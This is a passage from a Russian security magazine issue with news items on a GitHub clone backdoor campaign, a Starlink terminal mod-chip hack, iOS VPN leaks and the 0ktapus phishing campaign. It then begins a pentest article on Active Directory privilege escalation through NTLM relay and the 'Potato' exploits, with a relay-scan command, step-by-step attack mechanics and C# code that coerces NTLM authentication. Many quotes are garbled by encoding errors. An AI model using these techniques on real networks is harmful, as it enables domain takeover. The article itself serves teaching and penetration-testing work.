  ный   через   Google»,  и  заметил   в  коде  следующий  URL-адрес:
   hxxp://ovz1.j19544519.pr46m.vps.myjino[.]ru. Как оказалось, поиск на GitHub
  обнаруживает этот URL-адрес более чем в 35 тысячах файлов в самых разных
  репозиториях.





  При этом СМИ сообщили, что это число отражает имен но количество подоз-
   ритель ных файлов, а не заражен ных репозиториев, так что первичная оцен ка
  Лейси  была  не  совсем  верна.  Так,  из  35  788  резуль татов  поиска
  более 13 тысяч резуль татов были получены всего из одного репозитория —
   redhat-operator-ecosystem.
     После сообщения Лейси многие эксперты стали разбирать ся, что имен но
   тот обнаружил. К примеру, Джеймс Такер (James Tucker) выяснил, что клониро-
  ван ные  репозитории,  содержащие  вредоносный  URL-адрес,  извлекали
  перемен ные среды поль зователя, а так же оснащались однострочным бэк -
  дором. Таким образом, хакеры мог ли не толь ко похитить важные сек реты,
   в том числе ключи API, токены, учет ные дан ные от Amazon AWS и криптогра-
  фические ключи, но и выполнить произволь ный код в заражен ных системах.
     Так же даль нейший анализ показал, что подавляющее боль шинство репози-
  ториев-клонов появились в течение последнего месяца (от шести до двад цати
  дней назад), однако некоторые репозитории с вредоносными ком митами были
  датированы далеким 2015 годом, то есть, вероятно, были взломаны.
     При этом наиболее свежие ком миты, содержащие вредоносный URL-
   адрес, вообще исходили от защит ников, в том числе от аналитика угроз Фло-
  риана Рота (Florian Roth), который создал правила Sigma для обнаружения вре-
  доносного кода. К сожалению, не все разобрались в происходящем, и некото-
  рые поль зователи GitHub начали ошибочно жаловать ся на репозиторий Sigma,
   считая вредоносным и его.
    По дан ным Лейси и журналистов, в итоге администрация GitHub удалила
   прак тически все вредоносные репозитории-клоны со своей плат формы.


 В 2022 ГОДУ ОТ ФИШИНГОВЫХ АТАК МЕНЬШЕ ВСЕГО
  ПОСТРАДАЛИ ПОЛЬЗОВАТЕЛИ СТАРШЕ 55 ЛЕТ

   Интерес ную статис тику пред ставили аналитики ВТБ: пенсионе ры оказались наиме нее под -
   верже ны фишинговым атакам. По статис тике банка, в 2022 году самыми устойчивыми к фишин-
   говым атакам стали люди стар ше 55 лет : сре ди поль зовате лей, попав шихся на улов ки зло -
   умышленников и перехо див ших по вре донос ным ссыл кам, лишь 20% людей это го воз раста.
   Как выяс нилось, чаще других на удочку фишеров попадались люди 35–44 лет (32%) и 45–
   54 лет (25%).





   Ис сле дователи объ ясня ют, что в пос леднее вре мя внимание зло умышленников все чаще прив -
   лекает наибо лее активная воз рас тная группа клиентов 30–40 лет , которая боль ше поль зует ся
   цифровыми сер висами, в том чис ле для финансовых опе раций.





 STARLINK ВЗЛОМАЛИ
 С ПОМОЩЬЮ МОД-
 ЧИПА
  Известный ИБ-эксперт из Лёвен ского католического университета Лен нерт
  Воутерс (Lennert Wouters), ранее обнаруживший баг, который позволял уг нать
   Tesla за пару минут , рассказал, что на этот раз ему удалось ском прометировать
   терминал Starlink с помощью мод-чипа стоимостью 25 долларов. На кон -
  ферен ции Black Hat 2022 Воутерс объявил, что намерен сделать этот инстру -
  мент доступным для копирования.
    С  2018  года  ком пания  Илона Маска  запустила  на  орбиту  боль -
  ше 3000 спут ников Starlink. Эта спут никовая сеть призвана обеспечивать под -
  ключение к интернету в самых труд нодоступных местах на Зем ле, где рань ше
  под ключение было ненадежным,  дорогим  или  полностью недоступным.
  На орбиту планиру ют вывести еще тысячи спут ников, и Starlink, как и любая
  дру гая новая технология, не мог не заин тересовать хакеров и исследователей.
     Система Starlink состоит из трех основных частей. Первая — это сами спут -
   ники, которые движут ся по околозем ной орбите на высоте около 550 км
  и передают сиг налы на поверхность. Спут ники взаимодейству ют с дву мя сис-
  темами на Зем ле: шлюзами,  которые  отправляют  интернет-соединения
  на спут ники, и тарелками Dishy McFlatface, которые могут приобрести поль -
   зователи.  Исследование  Воутерса  сосредоточено имен но  вок руг  поль -
   зователь ских терминалов.





  Лен нерт Воутерс рассказал об одном из первых взломов терминала Starlink,
   спут никовой антенны Dishy McFlatface, которые обычно располагают на зда-
   ниях. Чтобы получить доступ к прошивке тарелки, Воутерс разобрал купленный
  им терминал и сам разработал специаль ный инстру мент для его взлома.
     Эту роль взяла на себя кастомная плата (мод-чип), собранная из готовых
   деталей, общая стоимость которых составила примерно 25 долларов. После
  под ключения к тарелке Starlink плата исполь зует ся для атаки типа fault injection
   («внед рение сбоев»), времен но замыкая систему, чтобы обойти защит ные
  механизмы Starlink. В итоге этот «глюк» позволил Воутерсу добрать ся до ранее
  заблокирован ных частей системы терминала.
     Для создания мод-чипа Воутерс отсканировал тарелку Starlink и создал пла-
   ту, под ходящую к плате Starlink. Его мод-чип необходимо припаять к плате
   Starlink и под ключить с помощью несколь ких проводов.
    Сам мод-чип состоит из мик рокон троллера Raspberry  Pi, флеш-памяти,
   элек трон ных перек лючателей и регулятора напряжения. При создании платы
  для поль зователь ского терминала инженеры Starlink напечатали на ней над -
  пись «Сделано людь ми на Зем ле» (Made on Earth by humans). На мод-чипе
  Воутерса написано: «Сломано людь ми на Зем ле»  (Glitched on  Earth by
   humans).





  Более того, исследователь решил сделать свой инстру мент опен сорсным,
  опубликовав свои наработ ки на GitHub, включая некоторые детали, необ-
  ходимые для запуска атаки.

        «Äîïóñòèì, âû çëîóìûøëåííèêè è õîòèòå àòàêîâàòü ñàì ñïóòíèê, —
        ïèøåò ýêñïåðò. — Âû ìîæåòå ïîïûòàòüñÿ ñîçäàòü ñîáñòâåííóþ ñèñòåìó, «
         êîòîðàÿ ïîçâîëèò îáùàòüñÿ ñî ñïóòíèêîì, îäíàêî ýòî äîâîëüíî ñëîæíî.
         Ïîýòîìó, åñëè âû õîòèòå àòàêîâàòü ñïóòíèêè, ëó÷øå çàéòè ñî ñòîðîíû
         ïîëüçîâàòåëüñêîãî òåðìèíàëà, âåäü ýòî, âåðîÿòíî, îáëåã÷èò âàì æèçíü».                 »
  Эн тузиасты уже давно изу чают поль зователь ские терминалы Starlink: их неод -
   нократ но разбирали, обсуждали их устройство на Reddit, однако Воутерс стал
  первым, кто обратил внимание на безопасность терминала и его чипов. Он
  рассказывает, что прошел через несколь ко этапов и перебрал немало разных
  под ходов, прежде чем создал свой опен сорсный мод-чип.
    Воутерс тестировал систему Starlink с мая 2021 года, добившись скорости
   заг рузки 268 Мбит/с и скорости скачивания 49 Мбит/с с кры ши здания своего
  университета. После этого он принял решение разобрать устройство. Исполь -
   зуя ком бинацию из «промыш ленного фена, инстру мен тов, изопропилового
  спирта и моря терпения», он смог снять с тарелки крыш ку и получил доступ
   к ее внут ренним ком понен там. В итоге это помог ло понять, как устройство заг -
  ружается и скачивает прошивки.
    В целом атака Воутерса обходит проверки безопасности и проверки под -
   писи, которые нужны, чтобы убедить ся, что система запускает ся правиль но
  и код не был под делан. «Мы исполь зуем это, чтобы точно рассчитать время
  внед рения сбоя», — объясняет Воутерс.
      Так, ког да тарелка Starlink включает ся, заг рузчик проходит через несколь ко
   этапов. Атака Воутерса провоцирует сбой в первом бут лоадере, заг рузчике
  ПЗУ, который прошит в SoC и не может быть обновлен. После этого появляет -
   ся возможность развернуть кастомную прошивку и получить кон троль над тер-
  миналом.


                                          Продолжение статьи →
← Начало статьи





  Исследователь уведомил Starlink о найден ных уязвимостях еще в прош лом
   году, и ком пания выплатила ему вознаграждение по прог рамме bug bounty.
  Разработ чики  Starlink даже пред ложили Воутерсу доступ к прог рам мному
  обеспечению устройства для даль нейших изысканий, однако тот отказался, так
   как уже углу бился в работу и хотел закон чить создание мод-чипа.
     При этом Воутерс отмечает, что, хотя SpaceX и выпустила обновление, что-
  бы усложнить атаку (в ответ он изменил свой мод-чип), основная проблема
  не может быть исправлена, пока ком пания не создаст новую версию основного
   чипа. По этой причине все поль зователь ские терминалы по-прежнему уяз-
  вимы, хотя реализовать атаку стало замет но труд нее.
    Спецификации мод-чипа уже доступны на GitHub, но Воутерс говорит, что
  не планиру ет продавать готовые платы, а так же не станет распространять кас-
  томную прошивку для поль зователь ского терминала или приводить точные
  дан ные о сбое, который он эксплу атировал.
     После выступления Воутерса на Black Hat инженеры Starlink опубликовали
   разверну тый ответ исследователю, в котором объяснили, как они имен но
  защищают свои системы.

       «Ìû íàõîäèì ýòó àòàêó âïå ÷àòëÿþùåé ñ òåõ íè÷åñêîé òî÷êè çðå íèÿ, è ýòî
        ïåðâàÿ ïîäîáíàÿ  àòàêà, î êîòîðîé íàì  ñòàëî èçâåñòíî, —  ãëàñèò «
         äîêóìåíò. — Ìû îæèäàåì, ÷òî çëîóìûøëåííèêè, îáëàäàþùèå èíâàçèâ-
       íûì ôèçè÷åñêèì äîñòóïîì, ñìîãóò ñîâåðøàòü âðå äîíîñíûå äåéñòâèÿ
         îò ëèöà îäíîãî êîìïëåê òà Starlink, èñïîëüçóÿ åãî èäåíòèôèêàòîð, ïîýòî-
        ìó ìû ïîëàãàåìñÿ íà ïðèíöèï „íàèìåíüøèõ ïðèâèëå ãèé“, ÷òîáû îãðà-
         íè÷èòü ïîñëåäñòâèÿ äëÿ ñèñòåìû â öåëîì».                 »
  Специалисты Starlink под черкивают, что для такой атаки необходим физичес-
  кий доступ к терминалу и в резуль тате сбоя при заг рузке можно ском промети-
   ровать толь ко одно кон крет ное устройство, а не всю сеть Starlink.


        «Îáû÷íûì ïîëüçîâàòå ëÿì Starlink íå íóæíî áåñïîêîèòüñÿ î òîì, ÷òî ýòà
         àòàêà çàòðîíåò èõ, èëè ïðåäïðèíèìàòü êàêèå‑òî îòâåòíûå äåéñòâèÿ», — «
        ðåçþìèðóþò â Starlink.                 »

 В 2 РАЗА ВЫРОС ИНТЕРЕС К РЕКЛАМЕ В TELEGRAM

   Сов мес тное иссле дование бир жи рекламы в Telegram-каналах Telega.in и сер виса для управле -
   ния контекс тной рекламы eLama показало, что в пер вом полуго дии инте рес к натив ной рекламе
   в Telegram в Рос сии уве личил ся почти в два раза.

   Обо рот рекламы в Telegram в июле 2022 года в целом не падал ниже значений января 2022-го
   по динамике сто имос ти 1000 показов рекламных пос тов в мес сендже ре. Самый рез кий рост
     ( 38% ) про изо шел в катего риях «Дети и родите ли», «Интернет и тех нологии» ( 21% ), а также
   «Биз нес и стар тапы» и «Региональ ные» (по 19% ). Самая высокая сто имость за 1000 показов
   была зафиксирована в катего рии «Инвестиции» — 3398 рублей.

   При этом сред няя сто имость 1000 прос мотров рекламы в боль шинс тве тематик снизилась
   в сред нем на 4–7% . Аналитики свя зывают это с бло киров кой зарубежных соцсетей и зна-
   читель ным притоком под писчиков  в  Telegram-каналы  и, сле дователь но, рез ким рос том
   количес тва прос мотров.





 VPN В IOS
 НЕ РАБОТАЕТ
 НОРМАЛЬНО
  Несколь ко лет назад инженеры ком пании Proton Technologies, стоящей за раз-
  работ кой ProtonMail и ProtonVPN, рассказали о баге в составе iOS 13.3.1,
  который не позволяет VPN-приложениям шифровать весь трафик. Как теперь
  сообщили ИБ-эксперты, проблема до сих пор не исправлена.
    В 2020 году специалисты Proton Technologies объясняли, что при исполь -
  зовании VPN операционная система должна зак рывать все интернет-соеди-
  нения и восстанавливать их уже через VPN-тун нель для защиты кон фиден -
  циаль ности и дан ных поль зователя. Однако iOS по какой-то причине не справ-
   ляет ся с зак рытием существу ющих соединений, и в итоге трафик остается
  незащищен ным. Так, новые интернет-соединения будут под ключать ся через
  VPN-тун нель, но соединения, которые уже были активны, ког да поль зователь
  под ключился к VPN-серверу, останут ся вне тун неля.
     Хотя незащищен ные соединения встречают ся все реже, основная проб-
  лема зак лючается в том, что IP-адрес поль зователя и IP-адрес сервера,
   к которому он под ключает ся, остаются откры тыми и сервер «видит» реаль ный
   IP-адрес поль зователя вместо IP-адреса VPN-сервера.
    Исследователи Proton Technologies продолжали ждать выхода пат ча очень
  долго. Время от времени специалисты обновляли свой от чет , чтобы сообщить,
   что исправления все еще нет, хотя Apple известно о проблеме. Так, до недав-
  него   времени   последнее   обновление   в   тек сте   было   датиро-
  вано 19 октября 2020 года, и в нем сообщалось, что уязвимость так и не была
  окон чатель но устранена в iOS 13.4, 13.5, 13.6, 13.7 и 14.
     Ранее в текущем году ИБ-исследователь и разработ чик Майкл Горовиц
   (Michael Horowitz) еще раз изу чил эту ситу ацию и обнаружил, что VPN в iOS
  по-прежнему не работают коррек тно и провоцируют утечки дан ных.


        «VPN â iOS íå ðàáîòàþò, — ïèøåò Ãîðîâèö â ïóáëèêàöèè, îçàã ëàâëåííîé
        „VPN â iOS — ýòî ñêàì“. — Ñíà÷àëà êàæåòñÿ, ÷òî îíè ðàáîòàþò íîðìàëü- «
          íî. Óñòðîéñòâî íà iOS ïîëó÷àåò íîâûé îáùå äîñòóïíûé IP-àäðåñ è íîâûå
        DNS-ñåðâåðû. Äàííûå ïåðåäàþòñÿ íà VPN-ñåðâåð. Íî ñî âðå ìåíåì
         äåòàëüíàÿ ïðîâåðêà äàííûõ, ïîêèäàþùèõ óñòðîéñòâî, ïîêàçûâàåò, ÷òî
         VPN-òóííåëü „ïðîòåêàåò“. Äàííûå ïîêèäàþò óñòðîéñòâî iOS íå ÷åðåç
         VPN-òóííåëü. Ýòî íå îáû÷íàÿ óòå÷êà DNS, ýòî óòå÷êà äàííûõ».                 »
  Горовиц говорит, что еще в мае 2022 года он отправил в Apple элек трон ное
  пись мо, сообщающее об этой утечке. В июле он рассказал, что обменялся
  с ком панией несколь кими пись мами, но никакого резуль тата это не дало:

        «Íà ñåãîäíÿøíèé äåíü, ïðèìåðíî ïÿòü íåäåëü ñïóñòÿ, Apple ïðàê òè÷åñ-
         êè íè÷åãî ìíå íå îòâå òèëà. Îíè íå ñêàçàëè, ïûòàëèñü ëè îíè âîññîçäàòü «
        ïðîáëåìó. Îíè íå ñêàçàëè, ñîã ëàñíû ëè îíè ñ òåì, ÷òî ýòî óÿçâèìîñòü.
        Îíè íè÷åãî íå ñêàçàëè îá èñïðàâëåíèè».                 »
  Кроме того, 18 августа 2022 года эксперты Proton Technologies опять обновили
  свой старый отчет. Они сообщают, что фун кция «рубиль ника», которую Apple
  пред ставила для разработ чиков с релизом iOS 14, действитель но блокиру ет
  дополнитель ный сетевой трафик, однако «некоторые DNS-запросы от служб
   Apple по-прежнему могут отправлять ся в обход VPN-под ключения».


       «Ìû  íåîäíîêðàòíî  ïîäíèìàëè  ýòîò  âîï ðîñ,  îáðàùàÿñü  ê  Apple.
        Ê ñîæàëå íèþ, èñïðàâëåíèå ïðîáëåìû âåñüìà ïðîáëåìàòè÷íî. Apple «
         çàÿâèëà, ÷òî äàííîå ïîâåäå íèå „îæèäàåìî“, à „Always On VPN äîñòóïåí
         òîëüêî íà êîíòðîëèðóåìûõ ñ ïîìîùüþ MDM óñòðîéñòâàõ“. Ìû ïðèçûâà-
       åì Apple ñäå ëàòü ïîëíîñòüþ áåçîïàñíóþ ðàáîòó â èíòåðíå òå äîñòóïíîé
         äëÿ âñåõ, à íå òîëüêî äëÿ òåõ, êòî ïîäêëþ÷åí ê ïðîï ðèåòàðíîìó ôðåé-
        ìâîðêó   óäàëåííîãî   óïðàâëå íèÿ   óñòðîéñòâàìè,   ðàçðàáîòàííîìó
         äëÿ ïðåäïðèÿòèé», — ïèøóò ýêñïåðòû Proton Technologies.                 »

 ДОРСИ СОЖАЛЕЕТ, ЧТО TWITTER СТАЛ КОМПАНИЕЙ





   Не дав но прос той поль зователь Twitter поинтересо вал ся у осно вате ля сер виса и быв шего CEO
   компании Дже ка Дор си, не кажет ся ли ему, что в пос леднее вре мя у социаль ной сети явные
   проблемы и она стала «слишком левой». Дор си, покинув ший пост главы компании в кон-
   це 2021 года, отве тил так:

            «Самая боль шая проблема и мое самое боль шое сожале ние свя заны с тем, →          что Twitter стал компанией».


   Ког да Дор си спро сили, как он сам видит Twitter (воз можно, неправитель ственной организа-
   цией или, напротив, государс твенным сер висом) и в какой структуре, по его мне нию, дол жна
   работать соцсеть, пос ледовал не менее инте рес ный ответ:

            «Открытый про токол. Это воз можно, Bitcoin доказал это, рав но как и HTTP, →         SMTP, HTML. [Twitter] точно не может принад лежать государс тву или компании,
         и это становит ся яснее с каждым днем».





 КАМПАНИЯ 0KTAPUS:
 СКВОЗНЫЕ АТАКИ
 НА 130 КОМПАНИЙ
  Специалисты Group-IB опубликовали деталь ный отчет, посвящен ный кам -
  пании 0ktapus. Эксперты сообщили, что фишин говые атаки на сот рудников
   Twilio и Cloudare были частью единой масштабной кам пании, в резуль тате
  которой  хакеры  ском прометировали  9931  учет ную  запись  более  чем
   в 130 ком паниях.
     Все  началось  со  взлома   Twilio,  который  произошел  в  начале
   августа 2022 года. Тог да выяснилось, что неизвестные злоумыш ленники орга-
  низовали эффективную фишин говую атаку на сот рудников ком пании, похитили
   их учет ные дан ные, а затем исполь зовали для доступа к информации о некото-
  рых клиентах.
     Как стало известно позже, этот инцидент зат ронул 125 ком паний — кли-
   ентов  Twilio, а вскоре о похожих атаках сообщили Cloudare, MailChimp
  и Klaviyo. Более того, атаки стали развивать ся даль ше — из-за ком прометации
  перечисленных ком паний пострадали их клиенты. Например, мессен джер
   Signal , который оказался зат ронут из-за взлома Twilio.
     Так же, по информации СМИ, среди целей хакеров были Coinbase, KuCoin,
   Binance,  Microsoft,  Telus,  Verizon  Wireless,  T-Mobile,  AT&T,  Sprint,  Rogers,
   Mailgun, Slack, Box, SendGrid, Yahoo, Sykes, BestBuy и Infosys. В Group-IB эту
  фишин говую кам панию называют беспрецеден тной по масштабу и охвату.
     Как рассказали аналитики, в целом жертв было нам ного боль ше, чем извес-
   тно сейчас, а кам пания 0ktapus активна как минимум с марта 2022 года.
  Основной целью этой кам пании была кража иден тификацион ных дан ных Okta
  и кодов двухфакторной аутен тификации (2ФА) для последу ющих атак на цепоч-
   ку поставок. Отчет гласит, что подавляющее боль шинство жертв 0ktapus
   находит ся в США и многие из них исполь зуют сервисы управления иден -
  тификацией и кон тролем доступа Okta.


         «Õîòÿ â ýòèõ àòàêàõ çëîóìûøëåííèêàì, âîçìîæíî, ïîâåçëî, ãîðàçäî
        áîëåå âåðîÿòíî, ÷òî îíè òùàòåëüíî ïðîäóìàëè ýòó ôèøèíãîâóþ êàì- «
         ïàíèþ, ÷òîáû çàïóñòèòü èçîùðåííûå àòàêè íà öåïî÷êó ïîñòàâîê. Ïîêà
         íåÿñíî, ïëàíèðîâàëèñü ëè „ñêâîçíûå“ àòàêè çàðàíåå èëè íà êàæäîì ýòà-
        ïå ïðåäïðèíèìàëèñü îïïîðòóíèñòè÷åñêèå äåéñòâèÿ. Íåñìîòðÿ íà ýòî,
        êàìïàíèÿ 0ktapus áûëà íåâåðîÿòíî óñïåøíîé, è åå ïîëíûé ìàñøòàá
        ìîæåò áûòü íåÿñåí åùå íåêîòîðîå âðå ìÿ», — ðàññêàçûâàåò Ðîáåðò
       Ìàðòèíåñ, ñòàðøèé àíàëèòèê Threat Intelligence â Group-IB.                 »
   Как уже было отмечено, основной целью злоумыш ленников было получение
   учет ных дан ных для Okta и кодов 2ФА сот рудников целевых организаций. Жер-
  твы хакеров получали тек стовые сообщения с ссылками на фишин говые сайты,
  имитиру ющие страницу аутен тификации Okta для их организации.





                   Фей ковая стра ница аутен тифика ции

  При этом до сих пор неясно, как хакеры составили список целей и как узнали
  телефон ные номера целевых сот рудников. По информации Group-IB, ата-
  кующие начали кам панию, нацеливаясь на операторов мобиль ной связи
  и телеком муникацион ные ком пании. Вероятно, это было сделано в рам ках
  под готовки и сбора дан ных.
    В общей сложности исследователи обнаружили 169 уникаль ных фишин -
  говых доменов, задействован ных в рам ках 0ktapus. В доменах исполь зовались
   такие ключевые слова, как SSO, VPN, OKTA, MFA и HELP. С точки зрения жер-
   твы, фишин говые сайты выг лядели убедитель но и походили на легитим ную
   страницу аутен тификации, которой те привык ли поль зовать ся. При этом все
  сайты были созданы с помощью одного и того же фишинг-кита, ранее неиз-
  вестного экспертам.
     Изу чив код этого фишинг-кита, аналитики обнаружили строки, связан ные
  с кон фигурацией бота в Telegram, а так же канал, который хакеры исполь зовали
  для сбора ском прометирован ных дан ных. Благодаря этому исследователи
  смог ли проанализировать дан ные, получен ные злоумыш ленниками с мар-
   та 2022 года.
    Сум марно хакерам удалось похитить учет ные дан ные 9931 поль зователя,
   в том числе 3129 записей с email и 5441 запись с кодами муль тифак торной
   аутен тификации. Посколь ку две трети записей содержали не корпоративную
   элек трон ную почту, а толь ко имена поль зователей и коды 2ФА, исследователи
  сумели определить лишь регионы проживания жертв: из 136 атакован ных ком -
  паний 114 находят ся в США.
     Боль шинство пострадавших связаны с ИТ, разработ кой прог рам много
  обеспечения и облачны ми сервисами, но так же злоумыш ленников интересо-
  вали криптовалют ные проекты и фирмы, занимающиеся финан сами и рек -
   рутин гом.
     Нужно сказать, что уже после публикации отчета Group-IB о себе заявили
  новые жертвы 0ktapus, тем самым полностью под твердив мрачные прог нозы
  специалистов.  Так,  стало известно,  что сразу три ком пании пострадали
   от хакерских атак и допустили утечки дан ных: принад лежащий Twilio 2ФА-сер-
  вис Authy, менед жер паролей LastPass, а так же сеть доставки еды DoorDash.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА
   Из-за неиз вес тно го бага из тысяч Solana-кошель ков похитили средс тва


   Хак-группа APT31 атакует рос сийский топливно-энер гетичес кий комплекс и СМИ


   Аме риканские влас ти наложили санкции на криптовалют ный миксер Tornado Cash. Раз работ чик
   арес тован


  В коммерчес ких ИБ-про дуктах без раз решения исполь зует ся чужой код


   Взло ман ано нимный сайт для рас сылки фекалий по почте


   Одобренные Microsoft UEFI-бут лоаде ры мог ли обойти Secure Boot


   Google запретит VPN-приложе ниям бло киро вать рекламу


  В бюд жетных под делках под извес тные Android-смар тфо ны нашли бэкдоры


   К зашифрованным архивам ZIP под ходят два раз ных пароля


   Кабель O.MG Elite получил рас ширенные сетевые воз можнос ти
COVERSTORY





     ПОВЫШАЕМ
    ПРИВИЛЕГИИ В AD
     ПРИ ПОМОЩИ
     REMOTEPOTATO0




В этой статье мы погово рим о раз ных
вари ациях   кросс-про токольной   ата ки
NTLM Relay с использовани ем экспло ита
                                                                                   snovvcrash
                                                                                       Безопасник, временамиRemotePotato0, а так же на этом при мере                                                                                    питонщик, местами
                                                                                       криптоана(рхист)литик, пообсу дим, как можно спря тать сиг натуру                                                                              необходимости системный
                                                                                   администраторисполня емо го фай ла от ста тического ана -                                                                                        snovvcrash@protonmail.ch
лиза.


Эта история относит ся к категории «байки с внут ренних пен тестов», ког да мы
попали в среду Active Directory, где члены группы безопасности Domain Users
(все поль зователи домена) обладали привилегией для удален ного под клю-
чения к кон троллерам домена по протоколу RDP. Хоть это уже само по себе
ужасная «мисконфига», потен циаль ный злоумыш ленник все еще должен найти
способ для локаль ного повышения привилегий на DC, что проблематично,
если на системе стоят все хот фиксы.
   Здесь и приходит на помощь баг фича из серии Microsoft Won’t Fix List —
кросс-сессион ное провоцирование вынужденной аутен тификации по протоко-
лу RPC. При отсутствии защиты службы LDAP от атак NTLM Relay оно мгновен -
но подарит тебе «ключи от королевства».


ÏÐÅÄÛÑÒÎÐÈß

Итак, внут ренний пен тест. Все по классике: толь ко я, мой ноут бук, капюшон
и маска Гая Фок са переговорка, ском мутирован ная розет ка RJ-45 и просторы
корпоративной  сети  жертвы  аудита.  Отсутствие  правил  филь трации
IPv6 в моем широковещатель ном домене — в роли уязвимости, отравлен ные
пакеты DHCPv6 Advertise с link-local IPv6-адресом моего ноут бука (mitm6 ) —
в роли атаки, и вот получен первоначаль ный аутен тифицирован ный доступ
в среду AD. Далее сбор дам па «блада» с помощью BloodHound.py, пока все
как обычно.
  Но вот то, что было даль ше, повергло меня в шок... Оказалось, что все
домен ные «поль заки» могут кон нектить ся к кон троллерам домена по RDP.
Действитель но, что может пойти не так?





                   Найди уязвимость на картинке

В  этот момент можно начинать потирать руки в пред вку шении кредов
доменад мина. Убедим ся, что мы можем релеить Net-NTLMv2-аутен тификацию
на службы LDAP(S) с помощью LdapRelayScan .



 ~$ python3 LdapRelayScan.py -method BOTH -dc-ip  -u  -p





                          PARTY TIME!

Неудивитель но, что LDAP Signing (защита LDAP, 389/TCP) и LDAP Channel
Binding (защита LDAPS, 636/TCP) отключены, — еще мало кто осознал, что
это мастхев-mitigations для AD в наше время.
  А теперь по поряд ку, что со всем этим можно сделать.


ÍÅÌÍÎÃÎ Î «ÊÀÐÒÎØÊÀÕ»

RottenPotato & Co
В далеком 2016 году умные люди придумали RottenPotato — технику локаль -
ного повышения привилегий с сервисных аккаунтов Windows (например, IIS
APPPOOL\DefaultAppPool или NT Service\MSSQL$SQLEXPRESS), обладающих
привилегией   олицет ворения    чужих    токенов   безопасности    (aka
SeImpersonatePrivilege), до NT AUTHORITY\SYSTEM.
   Для этого атакующий должен был:
 1. Спровоцировать  вынужденную   аутен тификацию  со  стороны  NT
  AUTHORITY\SYSTEM  на  машине-жертве  через   триг гер   API-ручки
  DCOM/RPC CoGetInstanceFromIStorage в отношении локаль ного слу -
   шателя (выступает в роли «человека посередине»).
 2. Од новремен но провести ëîêàëüíóþ атаку NTLM Relay на службу RPC
   (135/TCP) и дернуть API-вызов DCOM/RPC AcceptSecurityContext,
   передавая ему содержимое NTLM-части запроса Negotiate (NTLM Type 1)
   от NT AUTHORITY\SYSTEM .
 3. Под менить NTLM-челлендж (NTLM Type 2), исходящий от службы RPC
   (135/TCP), челлен джем, получен ным из ответа AcceptSecurityContext,
   и продолжить изначаль ный релей на RPC из шага 1. В этом кон тек сте
   NTLM-ответ службы RPC  (135/TCP) исполь зует ся просто  как шаблон
   сетевого ответа, в который мы инжектим нужное нам тело NTLM-челлен -
   джа.
 4. После успешного получения NTLM-аутен тификации (NTLM Type 3) клиента
  RPC из шага 1 в ответ на NTLM-челлендж (NTLM Type 2) из шага 3 зареле-
   ить ее на RPC-ручку AcceptSecurityContext и получить токен системы.
  На этом NTLM Relay окон чен.
 5. Им персонировать NT  AUTHORITY\SYSTEM . Мы можем  это сделать
   потому, что у нас есть привилегия SeImpersonatePrivilege.





     Механизм работы RottenPotato (изображение — jlajara.gitlab.io)

Некоторое время спустя лавочку прик рыли, запретив DCOM/RPC общать ся
с локаль ными слу шателями, — никаких тебе боль ше мит мов. Но «картошки»
все равно претерпевали изменения: были напилены LonelyPotato (неак туаль но)
и JuicyPotato — улучшенная версия RottenPotato, умеющая работать с разными
значениями CLSID (Class ID, иден тификатор COM-класса) для «арбу зин га» дру -
гих служб (помимо BITS, которую исполь зовала оригиналь ная «картошка»),
в которых реализован интерфейс IMarshal для триг гера NTLM-аутен тификации.




В дан ном слу чае провоцирование NTLM-аутен тификации в своей основе имеет
прин цип, схожий с вредоносной десериализацией объектов, толь ко здесь
это называется «ан маршалинг » — процесс восстановления COM-объекта
из последователь ности битов после его передачи в целевой метод в качестве
аргу мен та.
   Атакующий создает вредоносный COM-объект класса IStorage и вызывает
API CoGetInstanceFromIStorage с указанием ñîç äàòü объект класса с кон -
крет ным иден тификатором CLSID и èíè öèàëè çèðîâàòü его состоянием
из маршализирован ного вредоносного объекта. Одно из полей маршализи-
рован ного объекта содержит указатель на под кон троль ный атакующему слу -
шатель, на который автоматически приходит отстук с NTLM-аутен тификацией
в процессе анмаршалин га.


 public static void BootstrapComMarshal(int port)
 {
     IStorage stg = ComUtils.CreateStorage();


     // Use a known local system service COM server, in this
 cast BITSv1
     Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097"
 );


     TestClass c = new TestClass(stg, String.Format("127.0.0.1[{
 0}]", port));


     MULTI_QI[] qis = new MULTI_QI[1];


     qis[0].pIID = ComUtils.IID_IUnknownPtr;
     qis[0].pItf = null;
     qis[0].hr = 0;


     CoGetInstanceFromIStorage(null, ref clsid,
         null, CLSCTX.CLSCTX_LOCAL_SERVER, c, 1, qis);
 }


Под робнее о механизме  триг гера NTLM-аутен тификации в ходе абь юза
DCOM/RPC можно почитать в первом репорте Project Zero на эту тему.



RoguePotato
С релизом RoguePotato — эволюционировавшей версией JuicyPotato — был
продемонстрирован аль тернативный под ход к имперсонации привилегирован -
ных системных токенов:
 1. Злоумыш ленник под нимает кастомный сервис OXID (Object Exporter ID)
   Resolver íà ëîêàëüíîì ïîðòå атакуемой машины, отличном от 135/TCP.
   OXID-резолвер исполь зует ся в Windows для разрешения иден тификатора
   вызываемого интерфейса RPC (в нашем слу чае под кон троль ного аттакеру)
   в его имя, то есть в строку RPC-бин динга.
 2. Злоумыш ленник говорит службе DCOM/RPC машины-жертвы постучать ся
  íà óäà ëåí íûé IP-àäðåñ (кон тролиру ется атакующим) для резолва той
   самой OXID-записи. Это необходимо из-за того, что в Microsoft запретили
   обращать ся  к  локаль ным  OXID-резолверам,  слу шающим íå на пор-
   те 135/TCP.
 3. На том самом óäà ëåí íîì IP-àäðåñå злоумыш ленник под нимает socat
   (или любой дру гой TCP-редирек тор) на порте 135/TCP и «зеркалит» при-
  шед ший OXID-запрос на атакуемую машину в порт, на котором слу шает
   кастомный сервис OXID Resolver из шага 1. А он уже резолвит предос-
   тавлен ный иден тификатор в строку RPC-бин динга именован ного канала
  ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper] .
 4. Далее машина-жертва наконец-то делает вредоносный RPC-вызов (API-
   ручка IRemUnkown2 ) с под ключением к под кон троль ному атакующему пай-
   пу из шага 3, что позволяет нам имперсонировать под ключившийся клиент
   с помощью RpcImpersonateClient , как это описал @itm4n в судь бонос-
  ном ресерче PrintSpoofer — Abusing Impersonation Privileges on Windows 10
   and Server 2019 .





     Механизм работы RoguePotato (изображение — jlajara.gitlab.io)

С базовой теорией закон чили.




                        Potatoes — Windows Privilege Escalation — статья
                        с хорошим опи сани ем всех «картошек» и тай -
                     млай ном их появления.



REMOTEPOTATO0

Ââåäåíèå
